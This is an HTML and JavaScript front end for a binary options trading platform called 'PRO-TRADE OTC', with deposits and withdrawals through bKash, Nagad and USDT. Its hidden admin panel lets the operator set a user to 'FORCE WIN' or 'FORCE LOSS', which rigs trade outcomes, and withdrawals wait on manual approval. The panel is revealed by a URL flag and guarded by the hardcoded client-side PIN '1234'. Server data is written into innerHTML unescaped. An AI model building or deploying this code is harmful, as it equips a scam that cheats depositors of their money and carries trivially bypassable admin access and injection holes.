<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PRO-TRADE OTC | International Binary Trading Platform</title>
  <script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
  <script src="/socket.io/socket.io.js"></script>
  
  <style>
    :root {
      --bg-color: #0b0e14;
      --card-bg: rgba(23, 27, 38, 0.75);
      --text-color: #ffffff;
      --border-color: rgba(255, 255, 255, 0.08);
      --accent-green: #00e676;
      --accent-red: #ff1744;
    }

    body.light-mode {
      --bg-color: #f0f2f5;
      --card-bg: rgba(255, 255, 255, 0.85);
      --text-color: #1a2130;
      --border-color: rgba(0, 0, 0, 0.1);
    }

    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
    body { background: var(--bg-color); color: var(--text-color); overflow-x: hidden; transition: 0.3s; }

    .glass-card {
      background: var(--card-bg);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid var(--border-color);
      border-radius: 12px;
    }

    header {
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 20px;
      border-bottom: 1px solid var(--border-color);
    }
    .brand { font-size: 20px; font-weight: bold; color: var(--accent-green); }
    .balance-box { background: rgba(0,230,118,0.1); padding: 8px 16px; border-radius: 20px; font-weight: 600; color: var(--accent-green); border: 1px solid var(--accent-green); }
    .nav-btn { background: #293249; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; transition: 0.2s; }
    .nav-btn:hover { opacity: 0.9; }

    .market-bar { display: flex; gap: 10px; padding: 10px 20px; background: rgba(0,0,0,0.2); border-bottom: 1px solid var(--border-color); }
    .market-chip { padding: 6px 14px; border-radius: 15px; background: var(--card-bg); cursor: pointer; font-size: 13px; border: 1px solid var(--border-color); }
    .market-chip.active { background: var(--accent-green); color: black; font-weight: bold; }

    .container { display: grid; grid-template-columns: 1fr 320px; height: calc(100vh - 105px); }
    #chart-container { width: 100%; height: 100%; position: relative; }

    .control-panel { padding: 20px; display: flex; flex-direction: column; gap: 20px; border-left: 1px solid var(--border-color); }
    .input-group { display: flex; flex-direction: column; gap: 8px; }
    .input-group label { font-size: 12px; color: #848e9c; }
    .input-field { background: rgba(0,0,0,0.3); border: 1px solid var(--border-color); color: var(--text-color); padding: 12px; border-radius: 8px; font-size: 16px; outline: none; }
    
    .trade-btn { width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
    .btn-call { background: var(--accent-green); color: black; }
    .btn-put { background: var(--accent-red); color: white; }

    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; justify-content: center; align-items: center; }
    .modal-content { width: 480px; padding: 25px; max-height: 90vh; overflow-y: auto; }
    .close-btn { float: right; cursor: pointer; font-size: 20px; color: #848e9c; }
    .tab-container { display: flex; gap: 10px; margin-bottom: 20px; }
    .tab { flex: 1; text-align: center; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 6px; cursor: pointer; }
    .tab.active { background: var(--accent-green); color: black; font-weight: bold; }

    .admin-stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
    .stat-card { padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px; text-align: center; }
    .stat-value { font-size: 20px; font-weight: bold; color: var(--accent-green); margin-top: 5px; }

    .queue-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 6px; margin-bottom: 8px; font-size: 13px; }
    .action-btn { padding: 4px 8px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }

    @media (max-width: 768px) {
      .container { grid-template-columns: 1fr; grid-template-rows: 1fr auto; }
      .control-panel { height: 260px; }
    }
  </style>
</head>
<body>

  <header class="glass-card">
    <div class="brand">📈 PRO-TRADE OTC</div>
    <div style="display: flex; gap: 10px; align-items: center;">
      <button class="nav-btn" onclick="toggleTheme()">🌓 Theme</button>
      <div class="balance-box">Balance: $<span id="user-balance">1000.00</span></div>
      <button class="nav-btn" onclick="openModal('wallet-modal')">Deposit/Withdraw</button>
      <button id="admin-secret-btn" class="nav-btn" style="background: #e91e63; display: none;" onclick="openAdminRoom()">Admin Master Panel</button>
    </div>
  </header>

  <!-- Market Pair Categories -->
  <div class="market-bar">
    <div class="market-chip active" onclick="switchPair('EUR/USD OTC')">EUR/USD (OTC)</div>
    <div class="market-chip" onclick="switchPair('BTC/USDT OTC')">BTC/USDT (OTC)</div>
    <div class="market-chip" onclick="switchPair('AAPL OTC')">AAPL (OTC)</div>
    <div class="market-chip" onclick="switchPair('GOLD OTC')">GOLD (OTC)</div>
  </div>

  <div class="container">
    <div id="chart-container"></div>

    <div class="control-panel glass-card">
      <div class="input-group">
        <label>Timeframe</label>
        <select id="trade-time" class="input-field">
          <option value="60">1 Minute (60s)</option>
          <option value="120">2 Minutes (120s)</option>
          <option value="300">5 Minutes (300s)</option>
        </select>
      </div>

      <div class="input-group">
        <label>Investment Amount ($)</label>
        <input type="number" id="trade-amount" class="input-field" value="10" min="1">
      </div>

      <button class="trade-btn btn-call" onclick="placeTrade('CALL')">HIGHER ▲ (Payout 85%)</button>
      <button class="trade-btn btn-put" onclick="placeTrade('PUT')">LOWER ▼ (Payout 85%)</button>
      <div id="trade-status" style="font-size: 12px; text-align: center; color: #848e9c;">Market Syncing...</div>
    </div>
  </div>

  <!-- Wallet Modal -->
  <div id="wallet-modal" class="modal">
    <div class="modal-content glass-card">
      <span class="close-btn" onclick="closeModal('wallet-modal')">&times;</span>
      <div class="tab-container">
        <div class="tab active" id="tab-dep" onclick="switchWalletTab('dep')">Deposit ($5 Min)</div>
        <div class="tab" id="tab-with" onclick="switchWalletTab('with')">Withdraw ($10 Min)</div>
      </div>

      <div id="deposit-section">
        <div class="input-group" style="margin-bottom: 12px;">
          <label>Select Payment Gateway</label>
          <select id="dep-method" class="input-field">
            <option value="bKash">bKash Personal / Merchant</option>
            <option value="Nagad">Nagad Personal</option>
            <option value="USDT">USDT TRC20</option>
          </select>
        </div>
        <div class="input-group" style="margin-bottom: 12px;">
          <label>Amount ($5 Minimum)</label>
          <input type="number" id="dep-amount" class="input-field" placeholder="5.00" min="5">
        </div>
        <div class="input-group" style="margin-bottom: 12px;">
          <label>Transaction TRX ID</label>
          <input type="text" id="dep-trx" class="input-field" placeholder="Enter Transaction ID">
        </div>
        <button class="trade-btn btn-call" onclick="submitDeposit()">Submit Deposit Request</button>
      </div>

      <div id="withdraw-section" style="display: none;">
        <div class="input-group" style="margin-bottom: 12px;">
          <label>Select Gateway</label>
          <select id="with-method" class="input-field">
            <option value="bKash">bKash Personal</option>
            <option value="Nagad">Nagad Personal</option>
            <option value="USDT">USDT TRC20 Address</option>
          </select>
        </div>
        <div class="input-group" style="margin-bottom: 12px;">
          <label>Amount ($10 Minimum)</label>
          <input type="number" id="with-amount" class="input-field" placeholder="10.00" min="10">
        </div>
        <div class="input-group" style="margin-bottom: 12px;">
          <label>Account / Wallet Address</label>
          <input type="text" id="with-acc" class="input-field" placeholder="e.g. 01800000000">
        </div>
        <button class="trade-btn btn-put" onclick="submitWithdraw()">Submit Withdrawal Request</button>
      </div>
    </div>
  </div>

  <!-- Protected Admin Master Control Modal -->
  <div id="admin-modal" class="modal">
    <div class="modal-content glass-card" style="width: 550px;">
      <span class="close-btn" onclick="closeModal('admin-modal')">&times;</span>
      <h2 style="margin-bottom: 15px; color: var(--accent-green);">Admin Master Control Room</h2>

      <div class="admin-stat-grid">
        <div class="stat-card">
          <div>1h Deposit</div>
          <div class="stat-value" id="stat-1h-dep">$0.00</div>
        </div>
        <div class="stat-card">
          <div>1h Withdraw</div>
          <div class="stat-value" style="color: var(--accent-red);" id="stat-1h-with">$0.00</div>
        </div>
        <div class="stat-card">
          <div>24h Deposit</div>
          <div class="stat-value" id="stat-24h-dep">$0.00</div>
        </div>
        <div class="stat-card">
          <div>24h Net Profit</div>
          <div class="stat-value" id="stat-24h-profit">$0.00</div>
        </div>
      </div>

      <div class="input-group" style="margin-bottom: 15px;">
        <label>Target User Override Strategy (USER_101)</label>
        <select id="admin-user-mode" class="input-field" onchange="setAdminUserMode()">
          <option value="AUTO">AUTO (Natural System Algorithm)</option>
          <option value="FORCE_WIN">FORCE WIN (User Always Wins)</option>
          <option value="FORCE_LOSS">FORCE LOSS (User Always Loses)</option>
        </select>
      </div>

      <h4 style="margin-bottom: 10px;">Pending Transactions Queue</h4>
      <div id="pending-queue-list" style="max-height: 180px; overflow-y: auto;"></div>
    </div>
  </div>

  <script>
    const socket = io();
    let currentUserId = "USER_101";
    let currentBalance = 1000.00;
    const ADMIN_SECRET_PIN = "1234";

    // Reveal Secret Admin Button only if ?admin=true is present in URL
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('admin') === 'true') {
      document.getElementById('admin-secret-btn').style.display = 'block';
    }

    const chartContainer = document.getElementById('chart-container');
    const chart = LightweightCharts.createChart(chartContainer, {
      layout: { backgroundColor: '#0b0e14', textColor: '#d1d4dc' },
      grid: { vertLines: { color: 'rgba(42, 46, 57, 0.4)' }, horzLines: { color: 'rgba(42, 46, 57, 0.4)' } },
      crosshair: { mode: LightweightCharts.CrosshairMode.Normal },
      timeScale: { timeVisible: true, secondsVisible: true }
    });

    const candleSeries = chart.addCandlestickSeries({
      upColor: '#00c853', downColor: '#ff1744',
      borderUpColor: '#00c853', borderDownColor: '#ff1744',
      wickUpColor: '#00c853', wickDownColor: '#ff1744'
    });

    let currentCandle = null;

    socket.on('price_tick', (data) => {
      const time = Math.floor(data.timestamp / 1000);
      const price = data.price;

      if (!currentCandle || Math.floor(currentCandle.time / 60) !== Math.floor(time / 60)) {
        currentCandle = { time: time, open: price, high: price, low: price, close: price };
      } else {
        currentCandle.high = Math.max(currentCandle.high, price);
        currentCandle.low = Math.min(currentCandle.low, price);
        currentCandle.close = price;
      }

      candleSeries.update(currentCandle);
    });

    function placeTrade(type) {
      const amount = parseFloat(document.getElementById('trade-amount').value);
      const durationSec = parseInt(document.getElementById('trade-time').value);

      if (amount > currentBalance) { alert("Insufficient balance!"); return; }

      currentBalance -= amount;
      document.getElementById('user-balance').innerText = currentBalance.toFixed(2);

      socket.emit('place_trade', {
        userId: currentUserId, type: type, amount: amount, durationSec: durationSec
      });

      document.getElementById('trade-status').innerText = `Active Trade (${type}) Running...`;
    }

    socket.on('trade_result', (res) => {
      if (res.isWin) {
        currentBalance += res.payout;
        alert(`TRADE WIN! Payout: $${res.payout.toFixed(2)}`);
      } else {
        alert(`TRADE LOSS!`);
      }
      document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
      document.getElementById('trade-status').innerText = "Market Syncing...";
    });

    function openAdminRoom() {
      const pin = prompt("Enter Secret Admin Security PIN:");
      if (pin !== ADMIN_SECRET_PIN) { alert("Invalid PIN!"); return; }

      loadAdminData();
      openModal('admin-modal');
    }

    function loadAdminData() {
      fetch('/api/admin/data')
        .then(r => r.json())
        .then(data => {
          document.getElementById('stat-1h-dep').innerText = '$' + data.stats.dep1h;
          document.getElementById('stat-1h-with').innerText = '$' + data.stats.with1h;
          document.getElementById('stat-24h-dep').innerText = '$' + data.stats.dep24h;
          document.getElementById('stat-24h-profit').innerText = '$' + data.stats.profit24h;

          let queueHtml = '';
          data.pendingDeposits.forEach(d => {
            queueHtml += `<div class="queue-item">
              <span>DEP: $${d.amount} (${d.method}) - TRX: ${d.trxId}</span>
              <div>
                <button class="action-btn" style="background:#00c853;" onclick="processTx('${d.id}', 'DEPOSIT', 'APPROVE')">Approve</button>
                <button class="action-btn" style="background:#ff1744; color:white;" onclick="processTx('${d.id}', 'DEPOSIT', 'REJECT')">Reject</button>
              </div>
            </div>`;
          });

          data.pendingWithdrawals.forEach(w => {
            queueHtml += `<div class="queue-item">
              <span>WITH: $${w.amount} (${w.method}) - ACC: ${w.accountNo}</span>
              <div>
                <button class="action-btn" style="background:#00c853;" onclick="processTx('${w.id}', 'WITHDRAWAL', 'APPROVE')">Approve</button>
                <button class="action-btn" style="background:#ff1744; color:white;" onclick="processTx('${w.id}', 'WITHDRAWAL', 'REJECT')">Reject</button>
              </div>
            </div>`;
          });

          document.getElementById('pending-queue-list').innerHTML = queueHtml || '<div style="font-size:12px; color:#848e9c; text-align:center;">No pending transactions</div>';
        });
    }

    function processTx(id, type, action) {
      fetch('/api/admin/action', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ id, type, action })
      }).then(() => loadAdminData());
    }

    function setAdminUserMode() {
      const mode = document.getElementById('admin-user-mode').value;
      socket.emit('admin_set_user_mode', { userId: currentUserId, mode: mode });
    }

    function submitDeposit() {
      const amt = parseFloat(document.getElementById('dep-amount').value);
      const method = document.getElementById('dep-method').value;
      const trxId = document.getElementById('dep-trx').value;

      if (isNaN(amt) || amt < 5) { alert("Minimum deposit is $5"); return; }
      if (!trxId) { alert("Please enter Transaction TRX ID"); return; }

      fetch('/api/deposit', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ userId: currentUserId, amount: amt, method, trxId })
      }).then(() => {
        alert("Deposit request submitted for Admin Approval!");
        closeModal('wallet-modal');
      });
    }

    function submitWithdraw() {
      const amt = parseFloat(document.getElementById('with-amount').value);
      const method = document.getElementById('with-method').value;
      const accountNo = document.getElementById('with-acc').value;

      if (isNaN(amt) || amt < 10) { alert("Minimum withdrawal is $10"); return; }
      if (!accountNo) { alert("Please enter Account Number"); return; }

      fetch('/api/withdraw', {
        method: 'POST', headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ userId: currentUserId, amount: amt, method, accountNo })
      }).then(() => {
        alert("Withdrawal request submitted for Admin Approval!");
        closeModal('wallet-modal');
      });
    }

    function switchPair(pairName) {
      document.querySelectorAll('.market-chip').forEach(c => c.classList.remove('active'));
      event.target.classList.add('active');
      alert(`Switched to market pair: ${pairName}`);
    }

    function toggleTheme() {
      document.body.classList.toggle('light-mode');
    }

    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
    function switchWalletTab(tab) {
      if(tab === 'dep') {
        document.getElementById('deposit-section').style.display = 'block';
        document.getElementById('withdraw-section').style.display = 'none';
        document.getElementById('tab-dep').classList.add('active');
        document.getElementById('tab-with').classList.remove('active');
      } else {
        document.getElementById('deposit-section').style.display = 'none';
        document.getElementById('withdraw-section').style.display = 'block';
        document.getElementById('tab-with').classList.add('active');
        document.getElementById('tab-dep').classList.remove('active');
      }
    }
  </script>
</body>
  </html>
